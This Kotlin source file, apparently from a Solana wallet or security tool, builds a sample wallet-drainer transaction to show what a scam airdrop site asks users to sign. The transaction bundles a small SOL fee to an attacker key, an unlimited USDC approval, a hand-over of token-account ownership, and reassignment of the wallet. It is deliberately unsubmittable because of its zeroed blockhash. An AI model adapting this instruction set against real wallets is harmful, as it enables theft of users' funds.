package core

import codama.generated.token.TokenProgram
import codama.generated.token.instructions.approveInstruction
import codama.generated.token.instructions.setAuthorityInstruction
import codama.generated.token.pdas.findAssociatedTokenPda
import codama.generated.token.types.AuthorityType
import com.solana.publickey.SolanaPublicKey
import com.solana.transaction.AccountMeta
import com.solana.transaction.TransactionInstruction

/**
 * What a wallet-draining site asks you to sign behind a "claim your airdrop" button: a harmless-looking 0.001 SOL
 * fee, an unlimited spending permission on your USDC, the ownership of that token account, and the wallet itself
 * handed to a program. Built only to be read: its blockhash is all zeros, so the network would refuse it.
 */
object ExampleScam {
    private val ATTACKER = SolanaPublicKey.from("Attack1111111111111111111111111111111111111")
    private val USDC = SolanaPublicKey.from("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
    private val SYSTEM = SolanaPublicKey.from("11111111111111111111111111111111")

    suspend fun instructions(owner: SolanaPublicKey): List<TransactionInstruction> {
        val myUsdcAccount = findAssociatedTokenPda(owner, TokenProgram.PROGRAM_ID, USDC)
        val fee = TransactionInstruction(
            SYSTEM, listOf(AccountMeta(owner, true, true), AccountMeta(ATTACKER, false, true)),
            byteArrayOf(2, 0, 0, 0) + ByteArray(8) { (1_000_000L shr (8 * it)).toByte() },
        )
        val assign = TransactionInstruction(SYSTEM, listOf(AccountMeta(owner, true, true)), byteArrayOf(1, 0, 0, 0) + ATTACKER.bytes)
        return listOf(
            fee,
            approveInstruction(myUsdcAccount, ATTACKER, owner, amount = ULong.MAX_VALUE),
            setAuthorityInstruction(myUsdcAccount, owner, AuthorityType.ACCOUNT_OWNER, ATTACKER),
            assign,
        )
    }

    suspend fun transaction(owner: SolanaPublicKey): ByteArray =
        LegacyTransaction.compile(owner, SolanaPublicKey(ByteArray(32)), instructions(owner))
}
